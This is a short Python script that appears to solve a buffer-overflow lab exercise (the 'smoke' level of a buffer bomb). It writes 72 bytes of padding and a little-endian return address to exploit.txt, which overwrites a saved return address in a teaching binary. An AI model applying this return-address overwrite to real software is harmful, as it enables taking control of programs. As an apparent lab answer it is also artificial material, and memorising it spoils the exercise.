from struct import *

buf = ""
buf += ("31" + " ")*72 #creates string with "31 31 31 31 ..x72"
buf += "5e 8c 04 08" #return address for smoke: little endian
f = open("exploit.txt", "w") #sets up to write to file
f.write(buf) #writes to file

